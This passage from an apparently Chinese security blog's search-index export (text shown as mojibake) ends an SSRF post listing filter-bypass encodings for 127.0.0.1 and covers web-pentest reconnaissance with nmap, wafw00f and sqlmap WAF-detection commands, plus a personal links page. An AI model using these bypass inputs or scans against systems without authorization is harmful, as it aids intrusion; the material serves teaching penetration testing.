class="language-basic">â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  example.<span class="token keyword">com</span>List<span class="token punctuation">:</span>â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="11"><li>åˆ©ç”¨å¥å·</li></ol><pre class="line-numbers language-bash"><code class="language-bash">127ã€‚0ã€‚0ã€‚1  <span class="token operator">>></span><span class="token operator">></span>  127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="12"><li>åˆ©ç”¨è¿›åˆ¶è½¬æ¢</li></ol><pre class="line-numbers language-basic"><code class="language-basic">å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰ã€‚<span class="token number">115.239</span><span class="token number">.210.26</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  <span class="token number">16373751032</span>é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ<span class="token number">16</span>è¿›åˆ¶ï¼Œç»“æœï¼š<span class="token number">73</span> ef d2 <span class="token number">1</span>aç„¶åæŠŠ <span class="token number">73</span>efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ<span class="token number">8</span>è¿›åˆ¶è®°å¾—è®¿é—®çš„æ—¶å€™åŠ <span class="token number">0</span>è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶<span class="token punctuation">(</span>å¯ä»¥æ˜¯ä¸€ä¸ª<span class="token number">0</span>ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª<span class="token number">0</span>ï¼Œè·ŸXSSä¸­å¤šåŠ å‡ ä¸ª<span class="token number">0</span>æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·<span class="token punctuation">)</span>ï¼Œåå…­è¿›åˆ¶åŠ <span class="token number">0</span>xhttp<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">115.239</span><span class="token number">.210.26</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">016373751032</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0177.0</span><span class="token number">.0.1</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">2130706433</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="13"><li>åˆ©ç”¨ç‰¹æ®Šåœ°å€</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WEBå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEBå®‰å…¨ </tag>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBå®‰å…¨-ä¿¡æ¯æ”¶é›†</title>
      <link href="/post/77929c1c.html"/>
      <url>/post/77929c1c.html</url>
      
        <content type="html"><![CDATA[<h1 id="WEB-å®‰å…¨ä¹‹ä¿¡æ¯æ”¶é›†"><a href="#WEB-å®‰å…¨ä¹‹ä¿¡æ¯æ”¶é›†" class="headerlink" title="WEB å®‰å…¨ä¹‹ä¿¡æ¯æ”¶é›†"></a>WEB å®‰å…¨ä¹‹ä¿¡æ¯æ”¶é›†</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>å¯¹äº WEB æ¸—é€æµ‹è¯•æ¥è¯´ï¼Œä¿¡æ¯æ”¶é›†æ˜¯ç¬¬ä¸€æ­¥ï¼Œä¹Ÿæ˜¯è‡³å…³é‡è¦ä¸å¯å¿½ç•¥çš„ä¸€æ­¥ï¼Œè¯´æ˜¯å¯¹æ¸—é€çš„ç»“æœèµ·åˆ°å†³å®šæ€§ä½œç”¨ä¹Ÿä¸ä¸ºè¿‡ã€‚<br>æœ¬æ–‡å°†ç»“åˆç¬”è€…ä»¥å¾€ä¿¡æ¯æ”¶é›†çš„ç»éªŒï¼Œç»¼åˆä»‹ç»åœ¨è¿›è¡Œ WEB æ¸—é€æµ‹è¯•æ—¶ï¼Œéœ€è¦æ”¶é›†å“ªäº›ä¿¡æ¯ï¼Œä»¥åŠå„ç§ä¿¡æ¯æ”¶é›†çš„æ–¹æ³•ã€‚</p><h2 id="éœ€è¦æ”¶é›†å“ªäº›ä¿¡æ¯"><a href="#éœ€è¦æ”¶é›†å“ªäº›ä¿¡æ¯" class="headerlink" title="éœ€è¦æ”¶é›†å“ªäº›ä¿¡æ¯"></a>éœ€è¦æ”¶é›†å“ªäº›ä¿¡æ¯</h2><p>å¯¹äºä»¥ä¸‹çš„ä¿¡æ¯ï¼Œæ”¶é›†çš„è¶Šè¯¦ç»†è¶Šå¥½</p><ul><li>åŸŸåã€å­åŸŸå</li><li>Whois ä¿¡æ¯</li><li>IP</li><li>DNS ä¿¡æ¯</li><li>å¼€æ”¾çš„ç«¯å£åŠè¿è¡Œçš„æœåŠ¡</li><li>æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ</li><li>æœåŠ¡å™¨ç±»å‹</li><li>å¼€å‘è¯­è¨€</li><li>å¼€å‘æ¡†æ¶</li><li>ç½‘ç«™æ¶æ„</li><li>CMS ç±»å‹</li><li>CDN ç±»å‹</li><li>WAF ç±»å‹</li><li>ç½‘ç«™ç›®å½•</li><li>åŒ IP ç½‘ç«™</li><li>SSL è¯ä¹¦</li></ul><h2 id="æ”¶é›†æ–¹æ³•"><a href="#æ”¶é›†æ–¹æ³•" class="headerlink" title="æ”¶é›†æ–¹æ³•"></a>æ”¶é›†æ–¹æ³•</h2><h3 id="åŸŸåã€å­åŸŸå"><a href="#åŸŸåã€å­åŸŸå" class="headerlink" title="åŸŸåã€å­åŸŸå"></a>åŸŸåã€å­åŸŸå</h3><h4 id="æ”¶é›†æ–¹æ³•-1"><a href="#æ”¶é›†æ–¹æ³•-1" class="headerlink" title="æ”¶é›†æ–¹æ³•"></a>æ”¶é›†æ–¹æ³•</h4><ul><li>æœç´¢å¼•æ“ã€site:xxx.comã€‘</li><li>IP åæŸ¥åŸŸå</li><li>SSL æŸ¥è¯¢å­åŸŸå</li><li>DNS è®°å½•æŸ¥è¯¢å­åŸŸå</li><li>å­åŸŸåæšä¸¾</li></ul><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><ul><li><a href="https://x.threatbook.cn/">å¾®æ­¥åœ¨çº¿</a></li><li><a href="https://censys.io/">Censys</a></li><li>Layer å­åŸŸåæŒ–æ˜æœº</li></ul><h3 id="Whois-ä¿¡æ¯æŸ¥è¯¢"><a href="#Whois-ä¿¡æ¯æŸ¥è¯¢" class="headerlink" title="Whois ä¿¡æ¯æŸ¥è¯¢"></a>Whois ä¿¡æ¯æŸ¥è¯¢</h3><ul><li><a href="https://whois.aliyun.com/">é˜¿é‡Œäº‘ Whois</a></li><li><a href="https://whois.chinaz.com/">ç«™é•¿ä¹‹å®¶ Whois</a></li></ul><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><h4 id="æŸ¥ç½‘ç«™-IP"><a href="#æŸ¥ç½‘ç«™-IP" class="headerlink" title="æŸ¥ç½‘ç«™ IP"></a>æŸ¥ç½‘ç«™ IP</h4><ul><li><a href="http://www.ce8.com/">æµ‹å§</a></li><li><a href="https://www.boce.com/">BOCE</a></li></ul><h4 id="æŸ¥-IP-è¯¦ç»†ä¿¡æ¯"><a href="#æŸ¥-IP-è¯¦ç»†ä¿¡æ¯" class="headerlink" title="æŸ¥ IP è¯¦ç»†ä¿¡æ¯"></a>æŸ¥ IP è¯¦ç»†ä¿¡æ¯</h4><ul><li><a href="https://x.threatbook.cn/">å¾®æ­¥åœ¨çº¿</a></li><li><a href="https://censys.io/ipv4?q=">Censys</a></li><li><a href="https://www.ipip.net/ip.html">IPIP</a></li></ul><h3 id="DNS-ä¿¡æ¯"><a href="#DNS-ä¿¡æ¯" class="headerlink" title="DNS ä¿¡æ¯"></a>DNS ä¿¡æ¯</h3><h4 id="åœ¨çº¿æŸ¥è¯¢"><a href="#åœ¨çº¿æŸ¥è¯¢" class="headerlink" title="åœ¨çº¿æŸ¥è¯¢"></a>åœ¨çº¿æŸ¥è¯¢</h4><ul><li><a href="http://www.ce8.com/assistor/dns">æµ‹å§-DNS æŸ¥è¯¢</a></li><li><a href="https://www.boce.com/dns">BOCE-DNS æŸ¥è¯¢</a></li></ul><h4 id="æœ¬åœ°æŸ¥è¯¢"><a href="#æœ¬åœ°æŸ¥è¯¢" class="headerlink" title="æœ¬åœ°æŸ¥è¯¢"></a>æœ¬åœ°æŸ¥è¯¢</h4><ul><li>nslookup åŸŸå</li><li>CNAME æŸ¥è¯¢</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nslookup</span> -qt<span class="token operator">=</span>cname åŸŸå<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¼€æ”¾çš„ç«¯å£åŠè¿è¡Œçš„æœåŠ¡"><a href="#å¼€æ”¾çš„ç«¯å£åŠè¿è¡Œçš„æœåŠ¡" class="headerlink" title="å¼€æ”¾çš„ç«¯å£åŠè¿è¡Œçš„æœåŠ¡"></a>å¼€æ”¾çš„ç«¯å£åŠè¿è¡Œçš„æœåŠ¡</h3><h4 id="æŸ¥è¯¢å·¥å…·"><a href="#æŸ¥è¯¢å·¥å…·" class="headerlink" title="æŸ¥è¯¢å·¥å…·"></a>æŸ¥è¯¢å·¥å…·</h4><ul><li>Nmap</li><li>Masscan</li><li>Zmap</li></ul><h4 id="ä½¿ç”¨æ•™ç¨‹"><a href="#ä½¿ç”¨æ•™ç¨‹" class="headerlink" title="ä½¿ç”¨æ•™ç¨‹"></a>ä½¿ç”¨æ•™ç¨‹</h4><ul><li><a href="http://www.nmap.com.cn/doc/manual.shtm">Nmap ä¸­æ–‡æ‰‹å†Œ</a></li><li><a href="https://mntn0x.github.io/2019/08/02/nmap%E8%84%9A%E6%9C%AC/">Nmap è„šæœ¬</a></li><li><a href="https://wooyun.js.org/drops/nmap%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html">Nmap è„šæœ¬ä½¿ç”¨æ€»ç»“</a></li></ul><h3 id="æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ"><a href="#æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ" class="headerlink" title="æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ"></a>æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ</h3><h4 id="æœåŠ¡å™¨å¸¸ç”¨æ“ä½œç³»ç»Ÿ"><a href="#æœåŠ¡å™¨å¸¸ç”¨æ“ä½œç³»ç»Ÿ" class="headerlink" title="æœåŠ¡å™¨å¸¸ç”¨æ“ä½œç³»ç»Ÿ"></a>æœåŠ¡å™¨å¸¸ç”¨æ“ä½œç³»ç»Ÿ</h4><ol><li>Linux ç³»åˆ—<ul><li>Centos</li><li>Ubuntu</li><li>Debian</li><li>Fedora</li><li>ArchLinux</li><li>OpenSUSE</li><li>EulerOS</li><li>openEuler</li></ul></li><li>Windows ç³»åˆ—<ul><li>Windows server 2003</li><li>Windows server 2008</li><li>Windows server 2012</li><li>Windows server 2016</li><li>Windows server 2019</li></ul></li></ol><h4 id="é‰´åˆ«æ–¹æ³•"><a href="#é‰´åˆ«æ–¹æ³•" class="headerlink" title="é‰´åˆ«æ–¹æ³•"></a>é‰´åˆ«æ–¹æ³•</h4><ol><li>Nmap æ‰«æ</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«</span>nmap -O IP<span class="token comment" spellcheck="true"># smb-os-discovery.nse:è¿™ä¸ªè„šæœ¬ä¼šåŸºäºSMBåè®®å»åˆ¤åˆ«æ“ä½œç³»ç»Ÿ,ä¸»æœºå,åŸŸå,å·¥ä½œç»„å’Œå½“å‰çš„æ—¶é—´</span>nmap IP -p 139,445 --script<span class="token operator">=</span>smb-os-discovery.nse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æœåŠ¡å™¨ç±»å‹"><a href="#æœåŠ¡å™¨ç±»å‹" class="headerlink" title="æœåŠ¡å™¨ç±»å‹"></a>æœåŠ¡å™¨ç±»å‹</h3><h4 id="å¸¸è§æœåŠ¡å™¨ç±»å‹"><a href="#å¸¸è§æœåŠ¡å™¨ç±»å‹" class="headerlink" title="å¸¸è§æœåŠ¡å™¨ç±»å‹"></a>å¸¸è§æœåŠ¡å™¨ç±»å‹</h4><ol><li>Nginx</li><li>Apache</li><li>Tomcat</li><li>Microsoft IIS</li></ol><h4 id="é‰´åˆ«æ–¹æ³•-1"><a href="#é‰´åˆ«æ–¹æ³•-1" class="headerlink" title="é‰´åˆ«æ–¹æ³•"></a>é‰´åˆ«æ–¹æ³•</h4><ol><li>é”™è¯¯é¡µé¢ä¿¡æ¯</li><li>HTTP å“åº”å¤´ä¿¡æ¯</li><li>HTTP å¤´å­—æ®µé¡ºåº</li><li>ç•¸å½¢çš„è¯·æ±‚æµ‹è¯•</li></ol><h4 id="æµ‹è¯•å·¥å…·"><a href="#æµ‹è¯•å·¥å…·" class="headerlink" title="æµ‹è¯•å·¥å…·"></a>æµ‹è¯•å·¥å…·</h4><ul><li><a href="http://net-square.com/httprint.html">httprint</a></li><li><a href="https://www.computec.ch/projekte/httprecon/">httprecon</a></li></ul><h3 id="å¼€å‘è¯­è¨€"><a href="#å¼€å‘è¯­è¨€" class="headerlink" title="å¼€å‘è¯­è¨€"></a>å¼€å‘è¯­è¨€</h3><h4 id="è¯†åˆ«æ–¹æ³•"><a href="#è¯†åˆ«æ–¹æ³•" class="headerlink" title="è¯†åˆ«æ–¹æ³•"></a>è¯†åˆ«æ–¹æ³•</h4><ol><li><p>URL åç¼€</p><table><thead><tr><th align="center"><strong>åç¼€åç§°</strong></th><th align="center"><strong>ç¼–ç¨‹è¯­è¨€</strong></th></tr></thead><tbody><tr><td align="center">.php</td><td align="center">PHP</td></tr><tr><td align="center">.do</td><td align="center">Java</td></tr><tr><td align="center">.asp</td><td align="center">ASP</td></tr><tr><td align="center">.aspx</td><td align="center">ASP.NET</td></tr><tr><td align="center">.jsp</td><td align="center">JAVA</td></tr></tbody></table></li><li><p>æ ¹æ®å¼€å‘æ¡†æ¶è¯†åˆ«</p></li></ol><h3 id="ç½‘ç«™æ¶æ„"><a href="#ç½‘ç«™æ¶æ„" class="headerlink" title="ç½‘ç«™æ¶æ„"></a>ç½‘ç«™æ¶æ„</h3><ol><li>å‰åç«¯åˆ†ç¦»</li><li>CDN é›†ç¾¤</li></ol><h3 id="CMS-ç±»å‹"><a href="#CMS-ç±»å‹" class="headerlink" title="CMS ç±»å‹"></a>CMS ç±»å‹</h3><h4 id="è¯†åˆ«æ–¹æ³•-1"><a href="#è¯†åˆ«æ–¹æ³•-1" class="headerlink" title="è¯†åˆ«æ–¹æ³•"></a>è¯†åˆ«æ–¹æ³•</h4><ol><li>ç½‘é¡µç»“æ„ç‰¹å¾</li><li>ç½‘é¡µä»£ç æ³¨é‡Š</li><li>ç½‘é¡µå…³é”®å­—</li><li>URL ç‰¹å¾</li><li>favicon.ico</li></ol><h4 id="è¯†åˆ«å·¥å…·"><a href="#è¯†åˆ«å·¥å…·" class="headerlink" title="è¯†åˆ«å·¥å…·"></a>è¯†åˆ«å·¥å…·</h4><ul><li><a href="https://www.yunsee.cn/">äº‘æ‚‰å®‰å…¨å¹³å°</a></li><li><a href="https://pentest.gdpcisa.org/whatcms">CMS è¯†åˆ«</a></li><li><a href="http://finger.tidesec.net/">æ½®æ±æŒ‡çº¹ TideFinger</a></li></ul><h3 id="CDN-ç±»å‹"><a href="#CDN-ç±»å‹" class="headerlink" title="CDN ç±»å‹"></a>CDN ç±»å‹</h3><h4 id="è¯†åˆ«æ–¹æ³•-2"><a href="#è¯†åˆ«æ–¹æ³•-2" class="headerlink" title="è¯†åˆ«æ–¹æ³•"></a>è¯†åˆ«æ–¹æ³•</h4><ul><li>æŸ¥è¯¢ DNS è®°å½•</li><li>åˆ©ç”¨â€œå…¨çƒ Pingâ€ï¼ŒæŸ¥çœ‹ IP å½’å±</li><li>HTTP å“åº”å¤´ä¿¡æ¯</li></ul><h4 id="è¯†åˆ«å·¥å…·-1"><a href="#è¯†åˆ«å·¥å…·-1" class="headerlink" title="è¯†åˆ«å·¥å…·"></a>è¯†åˆ«å·¥å…·</h4><ul><li><a href="http://finger.tidesec.net/">æ½®æ±æŒ‡çº¹ TideFinger</a></li><li><a href="http://www.ce8.com/assistor/dns">æµ‹å§-DNS æŸ¥è¯¢</a></li></ul><h3 id="WAF-ç±»å‹"><a href="#WAF-ç±»å‹" class="headerlink" title="WAF ç±»å‹"></a>WAF ç±»å‹</h3><h4 id="è¯†åˆ«æ–¹æ³•-3"><a href="#è¯†åˆ«æ–¹æ³•-3" class="headerlink" title="è¯†åˆ«æ–¹æ³•"></a>è¯†åˆ«æ–¹æ³•</h4><ul><li>æ‹¦æˆªé¡µé¢çš„ç‰¹å¾ã€<a href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">çœ‹å›¾è¯† WAF</a>ã€‘</li><li>Cookie å€¼</li><li>HTTP å“åº”å¤´</li></ul><h4 id="è¯†åˆ«å·¥å…·-2"><a href="#è¯†åˆ«å·¥å…·-2" class="headerlink" title="è¯†åˆ«å·¥å…·"></a>è¯†åˆ«å·¥å…·</h4><ul><li><a href="https://github.com/EnableSecurity/wafw00f">Wafw00f</a></li><li>Nmap</li></ul><pre class="line-numbers language-bash"><code class="language-bash">nmap --script<span class="token operator">==</span>http-waf-fingerprintnmap --script<span class="token operator">=</span>http-waf-detect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>Sqlmap</li></ul><pre class="line-numbers language-bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://xxxx.com"</span> --identify-waf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç½‘ç«™ç›®å½•"><a href="#ç½‘ç«™ç›®å½•" class="headerlink" title="ç½‘ç«™ç›®å½•"></a>ç½‘ç«™ç›®å½•</h3><h4 id="æ”¶é›†æ–¹æ³•-2"><a href="#æ”¶é›†æ–¹æ³•-2" class="headerlink" title="æ”¶é›†æ–¹æ³•"></a>æ”¶é›†æ–¹æ³•</h4><ol><li>æœç´¢å¼•æ“</li></ol><pre><code>inurl:mysite.com</code></pre><ol start="2"><li>çˆ¬è™«</li><li>ä¿¡æ¯æ³„éœ²ï¼ˆå¼€æºã€Github æœç´¢ï¼‰</li><li>ç›®å½•éå†æ¼æ´</li><li>å­—å…¸æ‰«æ</li></ol><h4 id="å¸¸ç”¨å·¥å…·"><a href="#å¸¸ç”¨å·¥å…·" class="headerlink" title="å¸¸ç”¨å·¥å…·"></a>å¸¸ç”¨å·¥å…·</h4><ul><li>å¾¡å‰‘æ‰«æ</li><li><a href="https://github.com/c4bbage/WebRobot-v1.8.2">WebRobot</a></li><li><a href="https://github.com/H4ckForJob/dirmap.git">dirmap</a></li></ul><h3 id="åŒ-IP-ç½‘ç«™"><a href="#åŒ-IP-ç½‘ç«™" class="headerlink" title="åŒ IP ç½‘ç«™"></a>åŒ IP ç½‘ç«™</h3><h4 id="æŸ¥è¯¢å·¥å…·-1"><a href="#æŸ¥è¯¢å·¥å…·-1" class="headerlink" title="æŸ¥è¯¢å·¥å…·"></a>æŸ¥è¯¢å·¥å…·</h4><ul><li><a href="https://x.threatbook.cn/">å¾®æ­¥åœ¨çº¿</a></li><li><a href="https://fofa.so/">FOFA</a></li><li><a href="https://ti.qianxin.com/">å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒ</a></li><li><a href="https://ti.dbappsecurity.com.cn/">å®‰æ’å¨èƒæƒ…æŠ¥ä¸­å¿ƒ</a></li></ul><h3 id="SSL-è¯ä¹¦"><a href="#SSL-è¯ä¹¦" class="headerlink" title="SSL è¯ä¹¦"></a>SSL è¯ä¹¦</h3><h4 id="æŸ¥è¯¢å·¥å…·-2"><a href="#æŸ¥è¯¢å·¥å…·-2" class="headerlink" title="æŸ¥è¯¢å·¥å…·"></a>æŸ¥è¯¢å·¥å…·</h4><p><a href="https://censys.io/certificates">Censys</a></p>]]></content>
      
      
      <categories>
          
          <category> WEBå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEBå®‰å…¨ </tag>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘çš„ä¸ªäººä¸»é¡µå’Œç½‘ç«™</title>
      <link href="/post/89f29c06.html"/>
      <url>/post/89f29c06.html</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘åœ¨å„å¤§å¹³å°çš„ä¸ªäººä¸»é¡µ"><a href="#æˆ‘åœ¨å„å¤§å¹³å°çš„ä¸ªäººä¸»é¡µ" class="headerlink" title="æˆ‘åœ¨å„å¤§å¹³å°çš„ä¸ªäººä¸»é¡µ"></a>æˆ‘åœ¨å„å¤§å¹³å°çš„ä¸ªäººä¸»é¡µ</h1><h2 id="åšå®¢ç±»"><a href="#åšå®¢ç±»" class="headerlink" title="åšå®¢ç±»"></a>åšå®¢ç±»</h2><ul><li><a href="https://www.yuque.com/chenhaikun">è¯­é›€</a></li><li><a href="https://blog.csdn.net/chk218">CSDN</a></li><li><a href="https://www.zhihu.com/people/chen-hai-kun-41">çŸ¥ä¹</a></li><li><a href="https://juejin.cn/user/4248168661807997">æ˜é‡‘</a></li></ul><h2 id="ä»£ç ç±»"><a href="#ä»£ç ç±»" class="headerlink" title="ä»£ç ç±»"></a>ä»£ç ç±»</h2><ul><li><a href="https://github.com/truda8">Github</a></li><li><a href="https://gitee.com/chk668">Gitee</a></li></ul><h2 id="è®¾è®¡ç±»"><a href="#è®¾è®¡ç±»" class="headerlink" title="è®¾è®¡ç±»"></a>è®¾è®¡ç±»</h2><ul><li><a href="https://www.zcool.com.cn/u/17586471">ZCOOL ç«™é…·</a></li><li><a href="https://dribbble.com/chk218">Dribbble</a></li></ul><h1 id="ä¸ªäººç½‘ç«™"><a href="#ä¸ªäººç½‘ç«™" class="headerlink" title="ä¸ªäººç½‘ç«™"></a>ä¸ªäººç½‘ç«™</h1><ul><li><a href="https://www.puuuq.cn/">AI åœˆå¯¼èˆª</a></li><li><a href="https://tryda.puuuq.cn/">Truda Blog</a></li><li><a href="https://favicon.puuuq.cn/">Favicon Search</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Truda Blog</title>
      <link href="/post/5563808f.html"/>
      <url>/post/5563808f.html</url>
      
        <content type="html"><![CDATA[<h2 id="Truda-Blog"><a href="#Truda-Blog" class="headerlink" title="Truda Blog"></a>Truda Blog</h2><h3 id="2020å¹´11æœˆ13æ—¥ï¼ŒTruda-Blogæ­£å¼å»ºç«‹"><a href="#2020å¹´11æœˆ13æ—¥ï¼ŒTruda-Blogæ­£å¼å»ºç«‹" class="headerlink" title="2020å¹´11æœˆ13æ—¥ï¼ŒTruda Blogæ­£å¼å»ºç«‹"></a>2020å¹´11æœˆ13æ—¥ï¼ŒTruda Blogæ­£å¼å»ºç«‹</h3><h3 id="åŸºäº-Hexo-Github-è¯­é›€-çš„äº‘ç«¯å†™ä½œåšå®¢"><a href="#åŸºäº-Hexo-Github-è¯­é›€-çš„äº‘ç«¯å†™ä½œåšå®¢" class="headerlink" title="åŸºäº Hexo + Github + è¯­é›€ çš„äº‘ç«¯å†™ä½œåšå®¢"></a>åŸºäº Hexo + Github + è¯­é›€ çš„äº‘ç«¯å†™ä½œåšå®¢</h3>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
